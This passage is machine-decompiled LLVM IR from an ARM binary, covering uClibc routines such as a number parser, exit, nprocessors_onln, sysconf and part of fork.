  %tmp = icmp ugt i32 %v1_14714, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_14724

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_147d8

dec_label_pc_14724:                               ; preds = %bb64
  %v2_1472c = udiv i32 -1, %v0_14738
  %v3_1472c = urem i32 -1, %v0_14738
  store i32 %v0_14738, i32* %r1.global-to-local, align 4
  %v1_1473c = urem i32 %v3_1472c, 256
  store i32 %v1_1473c, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_1472c, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14758

dec_label_pc_14754:                               ; preds = %bb71, %dec_label_pc_147b4
  %v0_14754 = phi i32 [ %v1_1479444, %bb71 ], [ %v0_14754.pre, %dec_label_pc_147b4 ]
  br label %dec_label_pc_14758

dec_label_pc_14758:                               ; preds = %dec_label_pc_14724, %dec_label_pc_14754
  %v1_147dc27 = phi i32 [ %v1_147dc29, %dec_label_pc_14724 ], [ %v0_14754, %dec_label_pc_14754 ]
  %v0_14794 = phi i32 [ %v0_1475820, %dec_label_pc_14724 ], [ %v0_14754, %dec_label_pc_14754 ]
  %v1_14758 = inttoptr i32 %v0_14794 to i8*
  %v2_14758 = load i8, i8* %v1_14758, align 1
  %v3_14758 = zext i8 %v2_14758 to i32
  %v1_1475c = add nsw i32 %v3_14758, -48
  %v1_14760 = urem i32 %v1_1475c, 256
  store i32 %v1_14760, i32* %r1.global-to-local, align 4
  %v1_14768 = or i32 %v3_14758, 32
  %tmp79 = icmp ult i32 %v1_14760, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_14770

dec_label_pc_14770:                               ; preds = %dec_label_pc_14758
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_14768, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_14770
  %v1_14774 = add nsw i32 %v1_14768, -87
  %v5_1477c = urem i32 %v1_14774, 256
  store i32 %v5_1477c, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_14758, %dec_label_pc_14770, %bb65
  %v3_147ac = phi i32 [ %v1_14760, %dec_label_pc_14758 ], [ 40, %dec_label_pc_14770 ], [ %v5_1477c, %bb65 ]
  %v1_14780 = load i32, i32* %r5.global-to-local, align 4
  %v6_14784 = icmp slt i32 %v3_147ac, %v1_14780
  br i1 %v6_14784, label %dec_label_pc_14788, label %dec_label_pc_147d8.loopexit

dec_label_pc_14788:                               ; preds = %bb66
  %v0_14788 = load i32, i32* %ip.global-to-local, align 4
  %v1_14788 = load i32, i32* %r8.global-to-local, align 4
  %v9_14788 = icmp eq i32 %v0_14788, %v1_14788
  br i1 %v9_14788, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_14788
  %v1_1479440 = add i32 %v0_14794, 1
  store i32 %v1_1479440, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1479c

bb67:                                             ; preds = %dec_label_pc_14788
  %v3_14788 = icmp ult i32 %v0_14788, %v1_14788
  %v1_14794 = add i32 %v0_14794, 1
  store i32 %v1_14794, i32* %r4.global-to-local, align 4
  br i1 %v3_14788, label %dec_label_pc_1479c, label %dec_label_pc_147b4

dec_label_pc_1479c:                               ; preds = %bb67, %.thread39
  %v1_1479444 = phi i32 [ %v1_1479440, %.thread39 ], [ %v1_14794, %bb67 ]
  %v4_147a42443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_1479c = load i32, i32* %sl.global-to-local, align 4
  %v3_1479c = icmp uge i32 %v3_147ac, %v1_1479c
  %v9_1479c = icmp eq i32 %v3_147ac, %v1_1479c
  %v2_147a0 = xor i1 %v3_1479c, true
  %v3_147a0 = or i1 %v9_1479c, %v2_147a0
  br i1 %v3_147a0, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_1479c
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_1479c, %bb68
  %v4_147a4 = phi i32 [ %v4_147a42443, %dec_label_pc_1479c ], [ 0, %bb68 ]
  %v2_147a4 = xor i1 %v9_1479c, true
  %v3_147a4 = and i1 %v3_1479c, %v2_147a4
  br i1 %v3_147a4, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_147a4 = urem i32 %v4_147a4, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_147a8 = phi i32 [ %v5_147a4, %bb70 ], [ %v4_147a4, %bb69 ]
  %v2_147a8 = icmp eq i32 %v0_147a8, 0
  br i1 %v2_147a8, label %bb71, label %dec_label_pc_147b4

bb71:                                             ; preds = %thread-pre-split
  %v4_147ac = mul i32 %v0_14788, %v1_14780
  %v5_147ac = add i32 %v4_147ac, %v3_147ac
  store i32 %v5_147ac, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14754

dec_label_pc_147b4:                               ; preds = %bb67, %thread-pre-split
  %v0_147bc = call i32 @__aeabi_read_tp()
  %v0_147c0 = load i32, i32* %r7.global-to-local, align 4
  %v2_147c0 = and i32 %v0_14684, %v0_147c0
  store i32 %v2_147c0, i32* %r7.global-to-local, align 4
  %v0_147c4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_147c4, i32* %ip.global-to-local, align 4
  %v3_147c8 = load i16, i16* @global_var_23068.362, align 2
  %v4_147c8 = sext i16 %v3_147c8 to i32
  %v3_147d0 = add i32 %v4_147c8, %v0_147bc
  %v4_147d0 = inttoptr i32 %v3_147d0 to i32*
  store i32 34, i32* %v4_147d0, align 4
  %v0_14754.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14754

dec_label_pc_147d8.loopexit:                      ; preds = %bb66
  %v0_147d8.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_147d8

dec_label_pc_147d8:                               ; preds = %.thread, %dec_label_pc_147d8.loopexit
  %v1_147dc = phi i32 [ %v1_147dc27, %dec_label_pc_147d8.loopexit ], [ %v1_147dc29, %.thread ]
  %v2_147dc = phi i32 [ %v0_147d8.pre, %dec_label_pc_147d8.loopexit ], [ %v0_14678, %.thread ]
  %v2_147d8 = icmp eq i32 %v2_147dc, 0
  br i1 %v2_147d8, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_147d8
  %v3_147dc = inttoptr i32 %v2_147dc to i32*
  store i32 %v1_147dc, i32* %v3_147dc, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_147d8, %bb72
  %v0_147e4 = load i32, i32* %r7.global-to-local, align 4
  %v2_147e4 = icmp eq i32 %v0_147e4, 0
  %. = select i1 %v2_147e4, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_147f0 = icmp eq i32 %v0_14684, 0
  %v0_1481c.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_147f0, label %dec_label_pc_14814, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_1481c.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_147fc, label %dec_label_pc_14814

dec_label_pc_147fc:                               ; preds = %bb76
  %v0_14800 = call i32 @__aeabi_read_tp()
  %v3_14804 = load i16, i16* @global_var_23068.362, align 2
  %v4_14804 = sext i16 %v3_14804 to i32
  %v3_1480c = add i32 %v4_14804, %v0_14800
  %v4_1480c = inttoptr i32 %v3_1480c to i32*
  store i32 34, i32* %v4_1480c, align 4
  %v0_14810 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14810, i32* %ip.global-to-local, align 4
  %v0_14814.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14814

dec_label_pc_14814:                               ; preds = %bb76, %bb73, %dec_label_pc_147fc
  %v0_1481c.pre = phi i32 [ %v0_1481c.pre.pre, %bb76 ], [ %v0_14810, %dec_label_pc_147fc ], [ %v0_1481c.pre.pre, %bb73 ]
  %v0_14814 = phi i32 [ %v0_147e4, %bb76 ], [ %v0_14814.pre, %dec_label_pc_147fc ], [ %v0_147e4, %bb73 ]
  %v2_14814 = icmp eq i32 %v0_14814, 0
  br i1 %v2_14814, label %dec_label_pc_14814._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_14814
  %v2_14818 = sub i32 0, %v0_1481c.pre
  store i32 %v2_14818, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14814._crit_edge

dec_label_pc_14814._crit_edge:                    ; preds = %dec_label_pc_14814, %bb77
  %v0_1481c = phi i32 [ %v2_14818, %bb77 ], [ %v0_1481c.pre, %dec_label_pc_14814 ]
  ret i32 %v0_1481c

; uselistorder directives
  uselistorder i32 %v0_1481c.pre, { 1, 0 }
  uselistorder i32 %v0_1481c.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_147a4, { 1, 0 }
  uselistorder i1 %v3_1479c, { 1, 0 }
  uselistorder i32 %v1_1479c, { 1, 0 }
  uselistorder i32 %v5_1477c, { 1, 0 }
  uselistorder i32 %v1_14768, { 1, 0 }
  uselistorder i32 %v1_14760, { 2, 0, 1 }
  uselistorder i32 %v0_14794, { 1, 0, 2 }
  uselistorder i32 %v0_14754, { 1, 0 }
  uselistorder i32 %v3_14704, { 1, 0 }
  uselistorder i32 %v1_146f8, { 1, 0, 2 }
  uselistorder i32 %v0_146ec, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_146c8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14684, { 1, 0 }
  uselistorder i32 %v0_14680, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1467c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 3, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 0, 7, 1, 2, 3, 4, 5 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 34, { 1, 2, 0, 4, 8, 3, 9, 6, 5, 7 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14814._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_14814, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_147d8, { 1, 0 }
  uselistorder label %dec_label_pc_147b4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14758, { 1, 0 }
  uselistorder label %dec_label_pc_14754, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_146cc, { 1, 0 }
  uselistorder label %dec_label_pc_146c8, { 1, 0 }
  uselistorder label %dec_label_pc_14690, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r5, align 4
  %v4_14848 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 140) to i32*), align 4
  store i32 %v4_14848, i32* @r4, align 4
  %v2_14850 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_14868 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_14868)
  %v0_1487c = load i32, i32* @r5, align 4
  %v2_1487c = add i32 %v0_1487c, 16
  %v3_1487c = inttoptr i32 %v2_1487c to i32*
  %v4_1487c = load i32, i32* %v3_1487c, align 4
  call void @__pseudo_branch(i32 %v4_1487c)
  %v0_1488c = load i32, i32* @r5, align 4
  %v2_1488c = add i32 %v0_1488c, 632
  %v3_1488c = inttoptr i32 %v2_1488c to i32*
  %v4_1488c = load i32, i32* %v3_1488c, align 4
  %v2_14894 = icmp eq i32 %v4_1488c, 0
  br i1 %v2_14894, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_148a0 = xor i1 %v2_14894, true
  call void @__pseudo_cond_branch(i1 %v2_148a0, i32 %v4_1488c)
  store i32 %v2_14850, i32* @r0, align 4
  %v0_148b0 = load i32, i32* @r5, align 4
  %v2_148b0 = add i32 %v0_148b0, 44
  %v3_148b0 = inttoptr i32 %v2_148b0 to i32*
  %v4_148b0 = load i32, i32* %v3_148b0, align 4
  call void @__pseudo_branch(i32 %v4_148b0)
  %v0_148bc = call i32 @__GI___uClibc_fini()
  %v0_148c4 = load i32, i32* @r5, align 4
  %v2_148c4 = add i32 %v0_148c4, -48076
  %v2_148cc = icmp eq i32 %v2_148c4, 0
  br i1 %v2_148cc, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_148d4 = xor i1 %v2_148cc, true
  call void @__pseudo_cond_branch(i1 %v2_148d4, i32 %v2_148c4)
  %v0_148d8 = load i32, i32* @r6, align 4
  %v1_148dc = call i32 @__GI__exit(i32 %v0_148d8)
  %v0_148e0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_148e0, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v2_148e0 = load i32, i32* @r4, align 4
  %v5_148e0 = sdiv i32 %v2_148e0, 32768
  %v6_148e0 = and i32 %v5_148e0, %v1_148dc
  store i32 %v6_148e0, i32* @lr, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v4_148f8 = phi i32 [ %v1_148dc, %bb9 ], [ 0, %bb10 ]
  ret i32 %v4_148f8

; uselistorder directives
  uselistorder i32 %v1_148dc, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 -34288), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_14920 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 -34288))
  store i32 %v1_14920, i32* @r6, align 4
  %v2_14924 = icmp eq i32 %v1_14920, 0
  br i1 %v2_14924, label %dec_label_pc_149a4, label %dec_label_pc_1492c

dec_label_pc_1492c:                               ; preds = %entry
  store i32 272, i32* @sl, align 4
  %v0_14934 = load i32, i32* @r4, align 4
  %v2_14934 = add i32 %v0_14934, -34932
  store i32 %v2_14934, i32* @r8, align 4
  %v2_14938 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_14938, i32* @r7, align 4
  br label %bb18

dec_label_pc_14940:                               ; preds = %bb18
  %v3_14940 = load i32, i32* %stack_var_-36, align 4
  %v1_14944 = inttoptr i32 %v3_14940 to i32*
  %v2_14944 = load i32, i32* %v1_14944, align 4
  %v1_14948 = inttoptr i32 %v2_14944 to i8*
  %v2_14948 = load i8, i8* %v1_14948, align 1
  %v7_1494c = icmp eq i8 %v2_14948, 99
  br i1 %v7_1494c, label %dec_label_pc_14954, label %.backedge3

dec_label_pc_14954:                               ; preds = %dec_label_pc_14940
  %v1_14954 = add i32 %v2_14944, 1
  %v2_14954 = inttoptr i32 %v1_14954 to i8*
  %v3_14954 = load i8, i8* %v2_14954, align 1
  %v7_14958 = icmp eq i8 %v3_14954, 112
  br i1 %v7_14958, label %dec_label_pc_14960, label %.backedge3

dec_label_pc_14960:                               ; preds = %dec_label_pc_14954
  %v1_14960 = add i32 %v2_14944, 2
  %v2_14960 = inttoptr i32 %v1_14960 to i8*
  %v3_14960 = load i8, i8* %v2_14960, align 1
  %v7_14964 = icmp eq i8 %v3_14960, 117
  br i1 %v7_14964, label %dec_label_pc_1496c, label %.backedge3

dec_label_pc_1496c:                               ; preds = %dec_label_pc_14960
  %v1_1496c = add i32 %v2_14944, 3
  %v2_1496c = inttoptr i32 %v1_1496c to i8*
  %v3_1496c = load i8, i8* %v2_1496c, align 1
  %v4_1496c = zext i8 %v3_1496c to i32
  %v0_14970 = load i32, i32* @r4, align 4
  %v1_14970 = load i32, i32* @sl, align 4
  %v2_14970 = add i32 %v1_14970, %v0_14970
  %v3_14970 = inttoptr i32 %v2_14970 to i32*
  %v4_14970 = load i32, i32* %v3_14970, align 4
  %v2_14974 = mul nuw nsw i32 %v4_1496c, 2
  %v2_14978 = add i32 %v4_14970, %v2_14974
  %v3_14978 = inttoptr i32 %v2_14978 to i16*
  %v4_14978 = load i16, i16* %v3_14978, align 2
  %v1_1497c = and i16 %v4_14978, 8
  %v2_1497c = icmp eq i16 %v1_1497c, 0
  br i1 %v2_1497c, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_1496c
  %v1_14980 = load i32, i32* @r5, align 4
  %v2_14980 = add i32 %v1_14980, 1
  store i32 %v2_14980, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_1496c, %dec_label_pc_14940, %dec_label_pc_14954, %dec_label_pc_14960
  %v0_14984.pre = load i32, i32* @r6, align 4
  %v0_14990.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_1492c
  %v0_14990 = phi i32 [ %v0_14990.pre, %.backedge3 ], [ %v2_14934, %dec_label_pc_1492c ]
  %v0_14984 = phi i32 [ %v0_14984.pre, %.backedge3 ], [ %v1_14920, %dec_label_pc_1492c ]
  %v4_14994 = inttoptr i32 %v0_14984 to i32*
  %v5_14994 = call i32 @__GI_config_read(i32* %v4_14994, i32 %v2_14938, i32 258, i32 %v0_14990)
  %v2_14998 = icmp eq i32 %v5_14994, 0
  br i1 %v2_14998, label %dec_label_pc_14a08, label %dec_label_pc_14940

dec_label_pc_149a4:                               ; preds = %entry
  %v0_149a8 = load i32, i32* @r4, align 4
  %v2_149a8 = add i32 %v0_149a8, -34276
  store i32 %v2_149a8, i32* @r0, align 4
  %v1_149ac = call i32 @__GI_config_open(i32 %v2_149a8)
  store i32 %v1_149ac, i32* @r6, align 4
  %v2_149b0 = icmp eq i32 %v1_149ac, 0
  br i1 %v2_149b0, label %bb19, label %dec_label_pc_149bc

bb19:                                             ; preds = %dec_label_pc_149a4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_14a08

dec_label_pc_149bc:                               ; preds = %dec_label_pc_149a4
  %v0_149c0 = load i32, i32* @r4, align 4
  %v2_149c0 = add i32 %v0_149c0, -34260
  store i32 %v2_149c0, i32* @r8, align 4
  %v2_149c8 = add i32 %v0_149c0, -34224
  store i32 %v2_149c8, i32* @r7, align 4
  %v2_149cc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_149cc, i32* @r4, align 4
  br label %bb21

dec_label_pc_149d4:                               ; preds = %bb21
  %v0_14a00 = load i32, i32* @r8, align 4
  %v3_149d4 = load i32, i32* %stack_var_-36, align 4
  %v1_149d8 = inttoptr i32 %v3_149d4 to i32*
  %v2_149d8 = load i32, i32* %v1_149d8, align 4
  store i32 %v2_149d8, i32* @r1, align 4
  %v2_149dc = inttoptr i32 %v0_14a00 to i8*
  %v3_149dc = call i32 @__GI_strcoll(i8* %v2_149dc, i32 %v2_149d8)
  %v2_149e0 = icmp eq i32 %v3_149dc, 0
  br i1 %v2_149e0, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_149d4
  %v1_149e4 = load i32, i32* @r5, align 4
  %v2_149e4 = add i32 %v1_149e4, 1
  store i32 %v2_149e4, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_149d4
  %v0_149f0.pre = load i32, i32* @r7, align 4
  %v0_149f4.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_149bc
  %v0_149f4 = phi i32 [ %v0_149f4.pre, %.backedge ], [ %v1_149ac, %dec_label_pc_149bc ]
  %v0_149f0 = phi i32 [ %v0_149f0.pre, %.backedge ], [ %v2_149c8, %dec_label_pc_149bc ]
  %v4_149f8 = inttoptr i32 %v0_149f4 to i32*
  %v5_149f8 = call i32 @__GI_config_read(i32* %v4_149f8, i32 %v2_149cc, i32 459266, i32 %v0_149f0)
  %v2_149fc = icmp eq i32 %v5_149f8, 0
  br i1 %v2_149fc, label %dec_label_pc_14a08, label %dec_label_pc_149d4

dec_label_pc_14a08:                               ; preds = %bb18, %bb21, %bb19
  %v0_14a08 = load i32, i32* @r6, align 4
  %v1_14a0c = inttoptr i32 %v0_14a08 to i32*
  %v2_14a0c = call i32 @__GI_config_close(i32* %v1_14a0c)
  %v0_14a10 = load i32, i32* @r5, align 4
  %v2_14a10 = icmp eq i32 %v0_14a10, 0
  %.v0_14a10 = select i1 %v2_14a10, i32 1, i32 %v0_14a10
  ret i32 %.v0_14a10

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_14a08, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_14e3c

bb:                                               ; preds = %entry
  %v7_14a60 = mul i32 %arg1, 4
  %v8_14a60 = add i32 %v7_14a60, ptrtoint (i32* @global_var_14a68.514 to i32)
  call void @__pseudo_branch(i32 %v8_14a60)
  br label %dec_label_pc_14e3c

dec_label_pc_14e3c:                               ; preds = %bb, %entry
  %v0_14e40 = call i32 @__aeabi_read_tp()
  %v3_14e44 = load i16, i16* @global_var_23068.362, align 2
  %v4_14e44 = sext i16 %v3_14e44 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_14e50 = add i32 %v4_14e44, %v0_14e40
  %v4_14e50 = inttoptr i32 %v3_14e50 to i32*
  store i32 22, i32* %v4_14e50, align 4
  %v0_15034 = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_15034

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_15070 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_15070, i32* @ip, align 4
  store i32 12768, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r8.global-to-local, align 4
  %v4_1516016 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 12768) to i32*), align 4
  store i32 %v4_1516016, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1516418 = icmp eq i32 %v4_1516016, 0
  br i1 %v2_1516418, label %dec_label_pc_1516c, label %dec_label_pc_15090

dec_label_pc_15090:                               ; preds = %entry, %dec_label_pc_15160.backedge
  store i32 -61441, i32* @ip, align 4
  call void @__pseudo_branch(i32 -61536)
  %v0_1509c = load i32, i32* %r7.global-to-local, align 4
  %v1_1509c = add i32 %v0_1509c, 20
  %v2_1509c = inttoptr i32 %v1_1509c to i32*
  %v3_1509c = load i32, i32* %v2_1509c, align 4
  store i32 %v3_1509c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_150a0 = icmp eq i32 %v3_1509c, 0
  store i32 %v3_1509c, i32* %r4.global-to-local, align 4
  br i1 %v2_150a0, label %dec_label_pc_15160.backedge, label %dec_label_pc_150b0

dec_label_pc_15160.backedge:                      ; preds = %dec_label_pc_15090, %dec_label_pc_150dc
  %v0_15160 = load i32, i32* %r8.global-to-local, align 4
  %v1_15160 = load i32, i32* %r5.global-to-local, align 4
  %v2_15160 = add i32 %v1_15160, %v0_15160
  %v3_15160 = inttoptr i32 %v2_15160 to i32*
  %v4_15160 = load i32, i32* %v3_15160, align 4
  store i32 %v4_15160, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15164 = icmp eq i32 %v4_15160, 0
  br i1 %v2_15164, label %dec_label_pc_1516c, label %dec_label_pc_15090

dec_label_pc_150b0:                               ; preds = %dec_label_pc_15090
  %v0_150b0 = load i32, i32* %r8.global-to-local, align 4
  %v1_150b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_150b0 = add i32 %v1_150b0, %v0_150b0
  %v3_150b0 = inttoptr i32 %v2_150b0 to i32*
  %v4_150b0 = load i32, i32* %v3_150b0, align 4
  %v1_150b4 = add i32 %v4_150b0, 20
  store i32 %v1_150b4, i32* %r2.global-to-local, align 4
  %v1_150b8132 = inttoptr i32 %v1_150b4 to i32*
  %v2_150b8133 = load i32, i32* %v1_150b8132, align 4
  store i32 %v2_150b8133, i32* %r3.global-to-local, align 4
  %v3_150bc135 = icmp uge i32 %v2_150b8133, %v3_1509c
  store i1 %v3_150bc135, i1* %cpsr_c.global-to-local, align 1
  %v9_150bc141 = icmp eq i32 %v2_150b8133, %v3_1509c
  br i1 %v9_150bc141, label %dec_label_pc_150c4, label %dec_label_pc_150dc

dec_label_pc_150c4:                               ; preds = %dec_label_pc_150b0, %dec_label_pc_150c4.dec_label_pc_150b8_crit_edge
  %v0_150c4142 = phi i32 [ %v1_150bc.pre, %dec_label_pc_150c4.dec_label_pc_150b8_crit_edge ], [ %v3_1509c, %dec_label_pc_150b0 ]
  store i32 %v0_150c4142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_150d4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_150d4, label %dec_label_pc_150d8, label %dec_label_pc_150c4.dec_label_pc_150b8_crit_edge

dec_label_pc_150c4.dec_label_pc_150b8_crit_edge:  ; preds = %dec_label_pc_150c4
  %v0_150b8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_150bc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_150b8 = inttoptr i32 %v0_150b8.pre to i32*
  %v2_150b8 = load i32, i32* %v1_150b8, align 4
  store i32 %v2_150b8, i32* %r3.global-to-local, align 4
  %v3_150bc = icmp uge i32 %v2_150b8, %v1_150bc.pre
  store i1 %v3_150bc, i1* %cpsr_c.global-to-local, align 1
  %v9_150bc = icmp eq i32 %v2_150b8, %v1_150bc.pre
  br i1 %v9_150bc, label %dec_label_pc_150c4, label %dec_label_pc_150dc

dec_label_pc_150d8:                               ; preds = %dec_label_pc_150c4
  %v0_150d8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_150d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_150dc

dec_label_pc_150dc:                               ; preds = %dec_label_pc_150b0, %dec_label_pc_150c4.dec_label_pc_150b8_crit_edge, %dec_label_pc_150d8
  %v0_150dc = phi i32 [ %v0_150d8, %dec_label_pc_150d8 ], [ %v2_150b8133, %dec_label_pc_150b0 ], [ %v2_150b8, %dec_label_pc_150c4.dec_label_pc_150b8_crit_edge ]
  %v1_150dc = phi i32 [ %v0_150d8, %dec_label_pc_150d8 ], [ %v3_1509c, %dec_label_pc_150b0 ], [ %v1_150bc.pre, %dec_label_pc_150c4.dec_label_pc_150b8_crit_edge ]
  %v3_150dc = icmp uge i32 %v0_150dc, %v1_150dc
  store i1 %v3_150dc, i1* %cpsr_c.global-to-local, align 1
  %v9_150dc = icmp eq i32 %v0_150dc, %v1_150dc
  br i1 %v9_150dc, label %dec_label_pc_150e4, label %dec_label_pc_15160.backedge

dec_label_pc_150e4:                               ; preds = %dec_label_pc_150dc
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_150f8 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_150e8

dec_label_pc_150e8:                               ; preds = %dec_label_pc_15150, %dec_label_pc_150e4
  %v0_150e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_150e8 = add i32 %v0_150e8, 4
  %v2_150e8 = inttoptr i32 %v1_150e8 to i32*
  %v3_150e8 = load i32, i32* %v2_150e8, align 4
  store i32 %v3_150e8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_150ec = icmp eq i32 %v3_150e8, 0
  br i1 %v2_150ec, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_150e8
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_150e8, %bb
  %v2_150f4 = xor i1 %v2_150ec, true
  call void @__pseudo_cond_branch(i1 %v2_150f4, i32 %v3_150e8)
  %v0_150fc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_150fc, i32* %stack_var_-88, align 4
